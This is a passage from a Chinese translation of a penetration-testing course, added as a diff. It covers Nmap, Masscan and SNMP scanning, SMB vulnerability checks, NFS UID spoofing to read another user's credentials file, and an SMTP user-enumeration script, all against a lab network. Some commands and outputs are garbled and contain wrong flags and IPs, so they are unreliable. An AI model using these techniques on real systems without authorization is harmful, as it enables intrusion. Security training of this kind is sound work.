+由于三次握手从未完成，信息不会传递到应用层，因此不会出现在任何日志中。SYN 扫描也更快速、更高效，因为发送和接收的数据包更少。请注意，“隐蔽”一词是指过去原始的防火墙无法记录不完整的 TCP 连接。现代防火墙已不再如此，即使“隐蔽”这个称号一直沿用，它也可能具有误导性。
+
+### 7.2.2.3 TCP 连接扫描
+
+当运行 `nmap` 的用户没有原始套接字权限时，Nmap 将默认使用描述的 TCP connect 技术。由于 Nmap connect 使用 Berkeley sockets API 执行三次握手，因此不需要特权权限。然而，Nmap 必须等待连接完成后 API 才能返回连接状态，连接扫描比 SYN 扫描慢得多。
+
+有时我们可能专门用 `nmap` 执行连接扫描，例如，使用某些类型的代理进行扫描。我们使用 `-sT` 选项启动连接扫描：
+
+```
+kali@kali: $ nmap -sT 10.11.1.220
+Starting Nmap 7.70 (https://nmap.org) at 2019-03-04 13:67 EST
+nmap report for 10.11.1.220
+Host is up (1.3 latency).
+Not shown: 980 closed ports
+PORT SERVICE
+21/tcp open ftp
+53/tcp open domain
+88/tcp open kerberos-sec
+135/tcp open msrpc
+139/tcp open netbios-ssn
+389/tcp open ldap
+445/tcp open microsoft-ds
+464/tcp open passwd
+```
+
+
+
+> 234 - 使用 `nmap` 执行 TCP connect 扫描
+
+## 7.2.4 UDP 扫描
+
+在执行 UDP 扫描时，`Nmap` 使用两种不同方法的结合来判断端口是开放还是关闭。对于大多数端口，它将使用标准的“ICMP 端口不可达”方法，即通过向给定端口发送空数据包来实现。然而，对于常用端口（例如用于 `SNMP` 的 `161` 端口），它将使用协议-`SNMP` 数据包来获取该端口的响应。要执行 UDP 扫描，需要使用 `-U` 选项，并且需要 `sudo` 权限访问原始套接字（raw sockets）：
+
+```
+kal@kali:$ sudo nmap -sU -U 10.11.1.115
+Starting Nmap 7.80 (https://nmap.org) at 2019-03-04 12:46 EST
+Nmap report for 10.11.1.115
+Host is up (0.079 latency).
+Not shown: 997 open/filtered ports
+PORT STATE SERVICE
+111/udp open rpcbind
+137/udp open netbios-ssn
+161/udp open snmp
+```
+
+`Nmap` 扫描：1 个 IP 地址 (1 个主机)，耗时 22.49 秒
+
+`UDP` 扫描 (`-U`) 也可以与 `TCP` 扫描 (`-sS`) 选项结合使用，以构建更完整的目标画像：
+
+```
+kal@kali:$ sudo nmap -sS -U 10.11.1.115
+Starting Nmap 7.80 (https://nmap.org) at 2019-03-04 12:46 EST
+Nmap report for 10.11.1.115
+Host is up (0.15 latency).
+Not shown: 997 open/filtered ports, 989 closed ports
+PORT STATE SERVICE
+21/tcp open ftp
+22/tcp open ssh
+25/tcp open smtp
+80/tcp open http
+111/tcp open rpcbind
+139/tcp open netbios-ssn
+143/tcp open imap
+199/tcp open smux
+443/tcp open https
+3389/tcp open mysql
+32768/tcp open filet-nms
+111/udp open rpcbind
+137/udp open netbios-ssn
+161/udp open snmp
+```
+
+`Nmap` 扫描：1 个 IP 地址 (1 个在线主机)，耗时 64.74 秒
+
+在下一节中，我们将探索处理大型网络或受流量限制网络的技巧。
+
+> 202 (`Nmap`, 2019), https://nmap.org/book/scan-methods-udp-scan.html
+
+## 7.2.5 网络扫描
+
+为了处理大量的主机，或者为了节省网络流量，我们可以尝试使用网络扫描（Network Sweeping）技术来探测目标。我们先从宽范围扫描开始，然后对感兴趣的主机进行更特定的扫描。
+
+当使用 `Nmap` 的 `-sn` 选项进行扫描时，主机发现过程不仅包含 `ICMP` 回显。`ICMP` 请求中还添加了其他几种探测。`Nmap` 会向 `443` 端口发送 `TCP SYN` 包，向 `80` 端口发送 `TCP ACK` 包，并发送 `ICMP` 时间戳来验证主机是否可用。
+
+```
+kali@kali:~ nmap -sn 10.11.1.1-254
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 12:17 EST
+Nmap scan report for 10.11.1.5
+Host is up (0.026s latency).
+MAC Address: 00:50:56:89:70:15
+Nmap scan report for 10.11.1.7
+Host is up (0.026s latency).
+MAC Address: 00:50:56:36:32 (VMware)
+Nmap: 254 IP addresses (44 hosts up) scanned in 6.4 seconds
+```
+
+在标准的 `Nmap` 输出上使用 `grep` 命令查找在线机器可能非常麻烦。相反，使用 `Nmap` 的“greppable”输出参数 `-oG` 将结果保存为易于解析的格式。
+
+```
+kali@kali:~ nmap -v -sn 10.11.1.1-254 -oG ping-sweep.txt
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:34 EST
+Initiating ARP Scan at 11
+Scanning 254 hosts [port]
+Completed ARP Scan at 11:35, 4.7 elapsed (254 total hosts)
+Initiating DNS resolution of 254 hosts, at 11:35
+Nmap scan report for 10.11.1.1 [host down]
+Nmap scan report for 10.11.1.2 [host down]
+Nmap scan report for 10.11.1.3 [host down]
+Nmap scan report for 10.11.1.4 [host down]
+Nmap scan report for 10.11.1.5 [host down]
+Host is up (0.026s latency).
+MAC Address: 00:50:56:89:70:15 (VMware)
+...
+```
+```
+kali@kali:~ grep up ping-sweep.txt | cut -d " " -f2
+10.11.1.5
+10.11.1.7
+10.11.1.8
+```
+
+我们还可以跨网络扫描特定的 `TCP` 或 `UDP` 端口，以定位有用或存在漏洞的端口。这比 `ping` 扫描更准确。
+
+```
+kali@kali:~ nmap -p 80 10.11.1.254 -oG web-sweep.txt
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:38 EST
+Nmap scan report for 10.11.1.5
+Host is up (0.036s latency).
+PORT STATE SERVICE
+80/tcp closed
+MAC Address: 00:50:56:89:70:15 (VMware)
+Nmap scan report for 10.11.1.7
+Host is up (0.029s latency).
+PORT STATE SERVICE
+80/tcp filtered
+MAC Address: 00:50:56:36:32 (VMware)
+Nmap scan report for 10.11.1.8
+Host is up (0.034s latency).
+PORT STATE SERVICE
+80/tcp open
+MAC Address: 00:50:56:89:24 (VMware)
+...
+```
+```
+kali@kali:~ grep open web-sweep.txt | cut -d "" -f2
+10.11.1.8
+10.11.1.10
+10.11.1.13
+...
+```
+
+为了节省时间并网络资源，我们也可以扫描多个 `IP` 并探测短端口列表。例如，让我们使用 `--top-ports=20` 对 20 个端口进行 `TCP` 扫描、操作系统检测、脚本扫描和 `traceroute`：
+
+```
+kali@kali:~ nmap -sT -A --top-ports=20 10.11.1.254 -oG port-sweep.txt
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-04 11:40 EST
+Nmap scan report for 10.11.1.5
+Host is up (0.037s latency).
+PORT STATE SERVICE
+21/tcp closed ftp
+22/tcp closed ssh
+23/tcp closed telnet
+25/tcp closed smtp
+53/tcp closed domain
+80/tcp closed http
+110/tcp closed pop3
+Host script results:
+| nbstat: NetBIOS NAME: ALICE, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:89:70:15
+smb-os-discovery:
+| OS: Windows XP (2000 LAN Manager)
+```
+
+
+
+| OS CPE: `cpe:/microsoft:windows_xp:-`
+
+| Computer name: `alice`
+
+| NetBIOS computer name: `ALICE\x00`
+
+| Domain name: `thine.local`
+
+| Forest name: `thine.local`
+
+| FQDN: `alice.thinc.local`
+
+| System time: `2015-03-04T16:44:52+00:00`
+
+| smb-security-mode:
+
+| account_user: `guest`
+
+| authentication-level: `user`
+
+| challenge_response: `supported`
+
+| message_signing: `disabled (disabled, but supported)`
+
+| mb2-time: Protocol negotiation failed (SMB)
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+指纹抓取（Banner grabbing）对所使用的流量大小以及扫描速度都有显著影响。我们应该始终注意我们使用的 `nmap` 选项以及它们对我们扫描的影响。
+
+## 7.2.2.8 Nmap 脚本引擎 (NSE)
+
+我们可以使用 Nmap 脚本引擎 (`NSE`) 来启动用户创建的脚本，以自动化各种扫描任务。这些脚本可以执行广泛的功能，包括 DNS 枚举、暴力破解攻击，甚至是漏洞识别。`NSE` 脚本位于 `/usr/share/nmap/scripts` 目录。
+
+例如，`sm-os-discovery` 脚本尝试连接到目标系统上的 SMB 服务并确定其操作系统：
+
+```
+kali@kali:~$ nmap 10.11.1.220 --script=sm-os-discovery
+```
+
+```
+OS: Windows Server 2008 R2 7601 Service Pack 1 (Windows Server 2008 R2 Sta)
+OS CPE: cpe:microsoft:windows_server_2008::sp1
+Computer name: master
+NetBIOS computer name: MASTER\x00
+Domain name: thinc.local
+Forest name: thinc.local
+FQDN: master.thinc.local
+System time: 2013-12-27T22:33:57-08:00
+```
+
+Nmap done: 1 IP address (1 host) scanned in 5.85 seconds
+
+> 列表 244 - 使用 `nmap` 脚本引擎 (`NSE`) 进行指纹识别
+
+另一个实用的（且自解释明的）`NSE` 脚本是 `dns-zone-transfer`：
+
+```
+kali@kali:~$ nmap --scripts dns-zone-transfer -p 53 megacorpone.com
+```
+
+```
+Starting Nmap 7.70 (https://nmap.org/) at 2019-03-04 11:54 EST
+Nmap scan report for megacorpone.com (38.100.193)
+Host is up (0.018s latency).
+Other addresses for megacorpone.com (not scanned):
+```
+
+| 端口 状态 | |
+| :--- | :--- |
+| 53/tcp domain | dns-zone-transfer: SOA ns1.megacorpone.com. admin.megacorpone.com |
+| megacorpone.com. | MX 10 feb.mail.gani.net. |
+| megacorpone.com. | MX 20 pool.mail.gani.net. |
+| megacorpone.com. | MX 50 mail.megacorpone.com. |
+| megacorpone.com. | MX 60 mail2.megacorpone.com. |
+| megacorpone.com. | NS ns1.megacorpone.com. |
+
+> 列表 245 - 使用 `nmap` 执行 DNS 区域传输
+
+要查看有关脚本的更多信息，我们可以使用 `--script-help` 选项，它会显示脚本的描述以及我们可以在其中找到深度信息的 URL，例如脚本的参数和用法示例。
+
+# 攻击性安全
+使用 Kali Linux 2.0 进行渗透测试
+
+```
+kali@kali:-$ nmap --script-help dns-zone-transfer
+```
+
+```
+Starting Nmap 7.70 ((https://nmap.org )) at 2019-05-06 11:02 MDT
+dns-zone-transfer
+Categories: intrusive discovery
+https://nmap.org/nsedoc/scripts/dns-zone-transfer.html
+向 DNS 服务器请求区域 AXFR 查询。
+该脚本向 DNS 服务器发送 AXFR 查询。域名查询通过检查命令行上给出的名称、DNS 服务器的主机名确定，或者可以使用 `dns-zone-transfer.domain/config` 脚本参数进行指定。如果查询成功，将返回所有域名和域名类型，并带有通用类型特定数据（SOA/MX/NS/PTR/A）。
+```
+
+> 列表 246 - 使用 `--script-help` 选项查看有关脚本的更多信息
+
+在无法访问互联网的情况下，这些许多信息也可以在 `NSE` 脚本文件中找到。
+花些时间探索最新的 `NSE` 脚本，因为其中许多脚本非常有帮助且节省时间。
+
+## 7.2.9 练习
+
+- 1. 使用 `Nmap` 对你的目标 IP 范围进行 ping扫描（ping sweep）并将输出保存到文件中。使用 `-sP` 显示哪些端口是开启的。
+- 2. 扫描你在练习 1 中找到的 IP 地址的开启 Web 服务器端口。使用 `Nmap` 查找 Web 服务器和操作系统。
+- 3. 使用 `NSE` 脚本扫描实验室中运行 SMB 服务的地图。
+- 4. 使用 `Wireshark` 捕获 `Nmap` 连接并与 `Netcat` 端口扫描进行比较。它们相同吗？
+- 5. 使用 `Wireshark` 捕获 SYN 扫描并进行比较以识别差异。
+
+## 7.2.3 Masscan
+
+`Masscan` 可以说是最快的端口扫描器；它可以在大约 6 分钟内扫描互联网，每秒传输 1000 万数据包！虽然它最初设计用于扫描互联网，但它可以轻松扫描 A 类或 B 类子网，这在渗透测试期间是更目标范围。Kali 默认没有安装 `Masscan`；必须使用以下命令安装：
+
+```
+kali@kali:- sudo apt install masscan
+```
+
+将安装以下新软件包：
+`masscan`
+0 个升级，1 个新安装，0 个移除
+需要获取 184 kB 的存档。
+
+> 列表 247 - 在 Kali 上安装 `masscan`
+
+此操作后，将使用 184 kB 的磁盘空间。
+
+考虑这种情况：在大内部网络上定位开启了 TCP 端口 80 的机器（使用 `-p80` 选项）。由于 `masscan` 实现了自定义的 TCP/IP 栈，它需要访问原始套接字（raw sockets），因此
+
+> 请注意：此命令不要在 Kali 实验室网络中尝试，因为你将扫描你不允许的子网。此示例仅用于说明！
+
+```
+kali@kali:~ sudo masscan -p80 0.0.0.0/
+```
+
+> 列表 248 - 使用 `masscan` 查找子网中的所有 Web 服务器
+
+要扫描实验室网络中的 C 类子网，可以使用以下示例。我们将添加几个 `masscan` 选项，使用 `--rate` 指定数据流量的速度，使用 `--interface` 指定网络接口，并使用 `--router-ip` 指定网关的 IP 地址：
+
+```
+kali@kali:~ sudo masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1
+```
+
+```
+Starting masscan 1.0.3 (http://bit.ly/14g) on 2019-09-04 17:15:40 GMT
+forced: -S -Pn --randomize-hosts -v --send-end
+Initiating SYN Stealth Scan
+Scanning 256 hosts [1/host]
+Discovered open port 80/tcp on 10.11.1.14
+Discovered open port 80/tcp on 10.11.1.39
+Discovered open port 80/tcp on 10.11.1.29
+```
+
+
+
+Discovered open port `80/tcp` on `10.11.1.10`
+
+Discovered open port `80/tcp` on `10.11.1.50`
+
+Discovered open port `80/tcp` on `10.11.1.234`
+
+> 列表 249 - 使用 `masscan` 查找子网中的所有 Web 服务器
+
+## 7.3 NetBIOS
+
+使用 `masscan` 选项扫描 NetBIOS 扫描。
+
+### 7.3.2 SMB 脚本
+
+Nmap 包含许多用于发现和枚举 SMB 服务的 NSE 脚本。这些脚本可以在 `/usr/share/nmap/scripts` 目录找到：
+
+```
+kali@kali:-$ ls /usr/share/nmap/scripts/smb*
+/usr/share/nmap/scripts/smb2-capabilities.nse
+/usr/share/nmap/scripts/smb2-security-mode.nse
+/usr/share/nmap/scripts/smb2-time.nse
+/usr/share/nmap/scripts/smb-vuln-uptime.nse
+/usr/share/nmap/scripts/smb-brute.nse
+/usr/share/nmap/scripts/smb-double-pulsar-backdoor.nse
+/usr/share/nmap/scripts/smb-enum-domains.nse
+/usr/share/nmap/scripts/smb-enum-groups.nse
+/usr/share/nmap/scripts/smb-enum-processes.nse
+/usr/share/nmap/scripts/smb-enum-sessions.nse
+/usr/share/nmap/scripts/smb-enum-shares.nse
+/usr/share/nmap/scripts/smb-enum-users.nse
+/usr/share/nmap/scripts/smb-os-discovery.nse
+```
+
+> 列表 252 - 查找各种 nmap NSE 脚本
+
+# 使用 Kali Linux 进行渗透测试 2.0
+
+在这里我们发现了几个有趣的 Nmap NSE 脚本，它们可以执行诸如 OS 发现和 SMB 枚举等任务。
+
+让我们尝试 `smb-os-discovery` 模块：
+
+```
+kali@kali:- nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
+...
+Nmap scan report for 10.11.1.227
+Host is up (0.07s latency).
+PORT STATE SERVICE
+139/tcp open netbios-ssn
+nHost script results:
+smb-os-discovery:
+| OS: Windows 2000 (Windows 2000 LAN Manager)
+| OS: cpe:microsoft:windows_2000::-
+| Computer: srv2
+| NetBIOS computer: srv2
+| Workgroup: WORKGROUP
+```
+
+> 列表 253 - 使用 nmap 脚本引擎执行 OS 发现
+
+该特定脚本识别了一个潜在的操作系统匹配。
+
+为了检查已知的 SMB 协议漏洞，我们可以调用一个 `smb-vuln` NSE 脚本。我们将查看 `smb-vuln-ms08-067`，它使用 `--script-args` 选项向 NSE 脚本传递参数。
+
+> 如果你设置脚本参数 `unsafe=1`，将运行的脚本几乎（或完全）保证会导致受影响系统崩溃。无需说明，在启用此参数时要极度小心，特别是在扫描生产系统时。
+
+```
+kali@kali:- nmap -v -p 139, 445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.1.1.15
+Starting Nmap 7.70 (https://nmap.org) at 2019-03-04 12:27 EST
+NSE: Loaded 1 scripts for scanning.
+NSE: Script Pre-scanning.
+Scanning 10.11.1.5 [2 ports]
+...
+Completed NSE at 08:04, 17.39s elapsed
+Nmap scan report for 10.11.1.15
+Host is up (0.17s latency).
+PORT STATE SERVICE
+139/tcp open netbios-ssn
+445/tcp open microsoft-ds
+MAC Address: 00:50:56:AF:02:91 (VMware)
+Host script results:
+smb-vuln-ms08-067:
+| VULNERABLE:
+```
+
+PWK 2.0
+
+Copyright © Offensive Security Ltd. 保留所有权利。
+
+# Microsoft Windows 系统受远程代码执行漏洞 (MS08-067)
+
+IDs: `CVE-2008-4250`
+Microsoft Windows 2000 SP4、SP2 和 SP3、Server 2 Vista Gold 和 SP1、Server 2008 和 7 Pre-Beta 中的 Server 服务允许攻击者通过精心构造的 RPC 请求执行代码，该请求会触发路径下的溢出。
+
+发布日期：2008-10-23
+参考：
+https://cve.mitre.com/cgi-bin/cname.cgi?name=CVE-2008-4250
+https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
+
+> 列表 254 - 确定主机是否受 MS08-067 漏洞影响
+
+在这种情况下，Nmap 识别出 SMB 服务缺少至少一个针对 MS08-067¹¹²漏洞的关键补丁。
+
+## 7.3.2 练习
+
+- 使用 Nmap 映射实验室中运行 Windows 的 SMB 服务器列表。
+- 使用 NSE 脚本扫描这些系统的 SMB 漏洞。
+- 对这些系统使用 `nbtscan` 和 `enum41linux` 来识别你可以从不同版本的 Windows 中获得的数据类型。
+
+## 7.4 NFS 枚举
+
+网络文件系统 (`NFS`)²¹³ 是最初由 Sun Microsystems 在 1984 年开发的分布式文件系统协议。它允许客户端计算机上的用户通过网络访问文件，就像访问本地挂载的存储一样。
+
+NFS 通常与 UNIX 操作系统配合使用，并且在实现上主要是不安全的。它的设置可能有些困难，但发现 NFS 共享向全世界开放并不常见。这对于我们的渗透测试非常方便，因为我们可能利用它们来收集敏感信息、提升权限等。
+
+### 7.4.1 扫描 NFS 共享
+
+Portmapper²¹⁴ 和 RPCbind²¹⁵ 运行在 TCP RPC 服务上，并监听其所属的端口。RPC 进程在启动时会通知 rbind，注册它们正在监听的端口以及它们期望提供的 RPC 程序编号。
+
+客户端使用正确的 RPC 程序编号连接服务器上的 rpcbind。rbind 服务将客户端重定向到正确的端口号（通常是 TCP 端口 `2049`），以便其进行通信
+
+> ¹² (Microsoft, 2008), http://technet.microsoft.com/en-us/security/bulletin/ms08-067
+> ²¹³ (Wikipedia, 2019), https://en.wikipedia.org/wiki/Network_File_System
+> ²¹⁴ (Wikipedia, 2017), https://en.wikipedia.org/wiki/Portmap
+> ²¹⁵ (Red Hat, 2019), https://access.redhat.com/documentation/en-us/redhat_linux/6/html/methodology-portmap
+
+我们可以使用以下语法通过 nmap 扫描这些端口：
+
+```
+kali@kali:- nmap -v -p 111 10.11.1.254
+```
+
+> 列表 255 - 使用 nmap 识别具有 portmapper/rpcbind 的主机
+
+我们可以使用 NSE 脚本找到在 rpcbind 中注册的服务：
+
+```
+kali@kali:- nmap -sV -p 111 --script=rpcinfo 10.11.1.254
+Nmap scan report for 10.11.1.72
+Host is up (0.005s latency).
+PORT STATE VERSION
+111/tcp open rpcbind
+```
+
+
+
+| rpcinfo: program/proto
+
+10000/2,3 111/tcp rpcbind
+
+10000/2,3 111/udp rpcbind
+
+10003/2,4 2049/tcp nfs
+
+10003/2,4 2049/udp nfs
+
+10005/1,2 2011/tcp mountd
+
+10005/1,2 2011/udp mountd
+
+10021/1,3 4016/tcp lockmgr
+
+10021/1,3 4016/udp lockmgr
+
+10024/1 3959/tcp status
+
+10024/1 3959/udp status
+
+10027/2,3 2049/tcp nfs_acl
+
+10027/2,3 2049/udp nfs_acl
+
+> 列表 256 - 查询 rpcbind 以获取注册的服务
+
+### 7.4.2 Nmap NSE 脚本
+
+一旦运行 `nmap`，我们可以使用 `/usr/share/nmap/scripts` 下的 NSE 脚本收集额外信息、枚举 NFS 服务并发现额外的服务。
+
+```
+kali@kali:- ls /usr/share/nmap/scripts/nfs*
+nfs-ls.nse
+nfs-showmount.nse
+nfs-stats.nse
+```
+
+> 列表 257 - 定位 NFS 的 NSE 脚本
+
+我们可以使用脚本名称中的通配符 (`*`) 运行这些脚本：
+
+```
+kali@kali:- nmap -p 111 --script nfs* 10.11.1.72
+...
+```
+
+```
+PORT STATE SERVICE
+111/tcp open rpcbind
+| nfs-showmount: /home 10.11.0.0/255.0.0
+```
+
+> 列表 258 - 运行 NFS 的 NSE 脚本
+
+在这种情况下，home 目录是共享的，我们可以通过挂载到 Kali 虚拟机来访问它。我们将使用 `mount` 命令并带有 `-o nolock` 来禁用文件锁定，这在旧的 NFS 服务器上是需要的：
+
+```
+kali@kali:~$ mkdir home
+kali@kali:~$ sudo mount -o nolock 10.11.1.72 /home/
+kali@kali:~$ cd home && ls
+jenny joe45 john marcus ryuu
+```
+
+此文件列表，我们看到远程机器上有几个本地用户的目录。进一步挖掘，我们发现了一个引起注意的文件，因此尝试查看它：
+
+```
+kali@kali:~/home$ cd marcus
+kali@kali:~/marcus$ ls -la
+total 24
+drwxr-xr-x 2 2014 1014 4096 Jun 10 09:16
+drwxr-xr-x 7 root 4096 Sep 17 2015 ...
+-rw------- 1 1014 1014 48 Jun 10 09:16 creds.txt
+kali@kali:~/marcus$ cat creds.txt
+cat: creds.txt: Permission denied
+```
+
+似乎我们权限查看此文件。仔细观察文件权限，可以看到所有者的 UUID 为 1014，并且具有读 (`r`)、写 (`w`) 和执行 (`x`) 权限。这些信息可以做什么？由于我们对 Kali 机器有完全访问，可以尝试使用 `adduser` 命令添加本地用户，将该 UUID 修改为 1014，尝试访问文件：
+
+```
+kali@kali:~/stefan$ sudo adduser pwn
+Adding user 'pwn'...
+Adding new group 'pwn' (1001) with group 'pwn'
+Adding new user 'pwn' (1001)
+Creating home directory...
+```
+
+> 列表 261 -向 `/etc/passwd` 添加本地用户
+
+根据上面的输出，我们可以看到新用户是 1001，我们可以使用 `sed` 将其改为 1014。`-i` 选项用于原地修改：
+
+```
+kali@kali:~/home/marcus$ sudo sed -i -e /s/1001/1014/g /etc/passwd
+kali@kali:~/home/marcus$ cat /etc/passwd | grep pwn
+pwn:x:1014::/home/pwn:/bash
+```
+
+> 列表 262 - 更新 `/etc/`
+
+到为止为止。让我们尝试新添加的 `pwn` 用户，验证 UUID 是否更改，然后再次访问文件。我们将使用 `id` 命令显示当前 ID。最后，我们将尝试访问文件：
+
+```
+kali@kali:~/home/marcus$ su pwn
+pwn@kali:/root/marcus$ id
+uid=1014(pwn) gid=1014 groups=10
+```
+
+```
+pwn@kali:/root/marcus$ cat creds.txt
+Not what you are looking for, try harder!!!
+```
+
+> 列表 263 - 以 pwn 用户身份访问文件
+
+非常好！我们现在读取文件并在需要时更改它。虽然在这个特定实例中的内容不是我们预期的，但这种级别的系统以明文文件存储敏感信息而闻名。花点时间考虑在这种我们可以做什么，从替换 SSH 密钥到读取机密文件。
+
+## 7.4.2.1 练习
+
+- 使用 `Nmap` 获取实验室中运行 NFS 的机器列表。
+- 使用 NSE 脚本扫描这些系统并收集有关可用的额外信息。
+
+## 7.5 SMTP 枚举
+
+我们还可以从漏洞邮件服务器获取有关主机或网络的信息。简单邮件传输协议 (`SMTP`)²⁶ 支持许多有趣的命令，例如 `VRFY` 和 `EXPN`。`VRFY` 请求服务器验证电子邮件地址，而 `EXPN` 请求服务器提供邮件列表成员。这些通常用于验证邮件服务器上的现有用户，这在渗透测试期间非常有用。考虑这个例子：
+
+```
+kali@kali:- nc -nv 10.11.1.217 25
+(UNKNOWN) [10.11.1.217] 25 (smtp) open
+220 hotline.localdomain SMTP Postfix
+VRFY root
+```
+
+# 攻击性安全
+
+使用 Kali Linux 2.0 进行渗透测试
+
+VRFY identextist
+
+550 5.1.1 <identextist>: Recipient address rejected: User unknown in local recipient table <C
+
+列表 264 - 使用 ncat 验证 SMTP 服务器
+
+注意成功消息和错误消息之间的区别。SMTP 服务器会乐意地验证用户是否存在。此过程可以用于自动化帮助帮助用户名。考虑以下 Python 脚本，它打开一个 TCP 套接字，连接到 SMTP 服务器并对给定的用户名发布 `VRFY` 命令：
+
+```
+#!/usr/bin/python
+
+import socket
+import sys
+
+if len(sys.argv) != 2:
+    print("Usage: vrfy.py <username>")
+    sys.exit(0)
+
+# Create a Socket
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Connect to the Server
+connect = s.connect(('10.11.1.217',25))
+
+# Receive the banner
+banner = s.recv(1024)
+
+print banner
+
+# VRFY a user
+s.send('VRFY ' + sys.argv[1] + '\r\n')
+result = s.recv(1024)
+
+print result
+
+# Close the socket
+s.close()
+```
+
+列表 265 - 使用 Python 编写 SMTP 用户枚举脚本
+
+## 7.5.1.1 练习
+
+- 1. 搜索你的网络范围，是否可以识别出对 SMTP `VRFY` 命令有响应的系统。
+- 2. 尝试使用此 Python 代码，通过包含用户名的文本文件作为输入，自动化发现用户名的过程。
+
+## 7.6 SNMP
+
+多年来，我们发现许多网络管理员并不了解简单网络管理协议（`SNMP`）。这通常会导致 `SNMP` 配置错误，从而导致严重的信息泄露。
+
+# 使用 Kali Linux 2.0 进行渗透测试
+
+`SNMP` 基于 `UDP`，这是一种简单的无状态协议，因此容易受到 IP 欺骗和重放攻击的影响。此外，通用的 `SNMP` 协议 1、2 和 2c 不提供流量加密，这意味着 `SNMP` 信息和凭据可以在局域网上被轻易拦截。传统的 `SNMP` 协议也有身份验证方案，但许多系统仍配置为默认的公共（`public`）和私有（`private`）团体字符串。
+
+现在，考虑上述所有情况都适用于一个根据定义旨在用于“管理网络”的协议。由于这些所有原因，`SNMP` 是我们最喜欢的枚举协议之一。
+
+
+
+几年前，我们对一家为大量企业客户、银行和其他类似提供网络集成服务的公司进行了内部渗透测试。在对系统侦查几小时后，我们发现了一个大型 B 类网络，连接了数千台 Cisco 路由器。他们向我们解释说，这些路由器中的每一个都是客户的网关，用于管理和配置。
+
+### 7.6.1 SNMP MIB 树
+
+SNMP 管理信息库（MIB）是一个通常与网络管理相关的数据库。该数据库以树的形式组织，分支代表不同的组织或网络功能。树的叶子（leaf）包含外部用户可以访问和探测的具体值。IBM Knowledge Center²包含了大量关于 MIB 树的信息。
+
+| OID | 说明 |
+| :--- | :--- |
+| 1.3.6.1.2.1.25.1.6.0 | 系统进程 |
+| 1.3.6.1.2.1.25.4.2.1.2 | 运行中的程序 |
+| 1.3.6.1.2.25.4.2.1.4 | 进程路径 |
+| 1.3.6.1.2.25.3.1.4 | 存储单元 |
+| 1.3.6.1.2.25.6.3.1.2 | 软件名称 |
+| 1.3.6.1.4.17.1.2.25 | 用户账户 |
+| 1.3.6.1.2.16.13.1.3 | TCP 本地端口 |
+
+表 6 - Windows SNMP MIB 值
+
+¹⁷ (IBM, 2019), https://www.ibm.com/support/knowledgecenter/ssw_ai_71/programming/mib.html
+
+## 7.6.2 扫描 SNMP
+
+要扫描 SNMP 端口，我们可以像后续示例中的 `nmap`。`-sU` 选项用于执行 UDP 扫描，`--open` 选项用于将输出限制为开放端口：
+
+```
+kali@kali:$ sudo nmap -su --open -p 161 10.11.1.1-25 -oG open-snmp.txt
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-01 06:26 UTC
+nmap report for 10.11.1.7
+host is up (008s).
+PORT STATE SERVICE
+161/udp open
+MAC Address: 00:50:56:9A:DC (VMware)
+nmap report for 10.11.1.10
+host is up (008s).
+PORT STATE SERVICE
+161/udp filtered
+MAC Address: 00:58:56:93:EC (VMware)
+```
+
+列表 266 - 使用 `nmap` 执行扫描
+
+或者，使用类似 `onesixtyone`⁸ 的工具，它将尝试对 IP 地址列表进行暴力破解。我们必须首先构建包含团体字符串和 IP 地址的文本文件：
+
+```
+kali@kali:$ echo public > community
+kali@kali:$ echo private > community
+kali@kali:$ echo manager > community
+kali@kali:$ for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
+```
+
+```
+kali@kali:$ onesixtyone -c ips
+Scanning 254 hosts, 3 communities
+10.11.1.14 [public] Hardware: x86 Family 6 12/COMPATIBLE - Soft: Windows 2000 Version 5.1 (Build 6000) Processor
+10.11.1.13 [public] Hardware: x86 Family 6 12/COMPATIBLE - Soft: Windows 2000 Version 5.1 (Build 6000) Processor
+10.11.1.22 [public] Linux 2.4.18-3 Thu Apr 18
+```
+
+列表 267 - 使用 `onesixtyone` 暴力破解团体字符串⁸ (Alexander Sotrov,2008), from www.phre.org/software/onesixtyone/
+
+## 7.6.3 SNMP 枚举
+
+一旦我们有了 SNMP 服务，就可以使用 `snmpwalk` 等工具探测特定的 MIB 数据，在大多数情况下，只读团体字符串是 "`public`"。
+
+### 7.6.3.1 枚举 MIB 树
+
+使用列表 268 中的某些 MIB 值，我们可以对已知机器进行枚举。此命令使用 `-c` 选项指定团体字符串，使用 `-v` 指定 SNMP 版本，并使用 `-t` 将超时增加到 10 秒。
+
+```
+kali@kali:~ snmpwalk -c public -v -t 10 10.11.1.14
+
+iso.3.6.1.2.1.1.1.0: STRING: "Hardware: X86 Family 6 12/COMPATIBLE - Soft: Windows 5.1 (Build 2680) Processor
+
+iso.3.6.1.2.1.1.1.2.0: OID: iso.3.6.1.4.1.311.1.3.1
+
+iso.3.6.1.2.1.1.1.2.10: Timeticks: 232 days, 2:56:44
+
+iso.3.6.1.2.1.1.1.4.0: ...
+```
+
+列表 269 - 使用 `snmpwalk` 枚举 MIB 树
+
+### 7.6.3.2 枚举 Windows 用户
+
+此示例枚举了用户：
+
+列表 270 - 使用 `snmpwalk` 枚举 Windows 用户。
+
+### 7.6.3.3 枚举进程
+
+此示例枚举了进程：
+
+列表 271 - 使用 `snmpwalk` 枚举 Windows 进程。
+
+### 7.6.3.4 枚举开放 TCP 端口
+
+此示例枚举了开放的 TCP 端口：
+
+```
+kali@kali:~ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.63.13.1.3
+
+iso.3.6.1.2.1.63.13.1.3.0.0.0.21.0.0.0.18646 = INTEGER: 21
+
+iso.3.6.1.2.1.63.13.1.3.0.0.0.80.0.0.0.45310 = INTEGER: 80
+
+iso.3.6.1.2.1.63.13.1.3.0.0.0.135.0.0.0.24806 = INTEGER: 135
+```
+
+列表 272 - 使用 `snmpwalk` 枚举开放端口
+
+### 7.6.3.5 枚举已安装软件
+
+此示例枚举了已安装的软件：
+
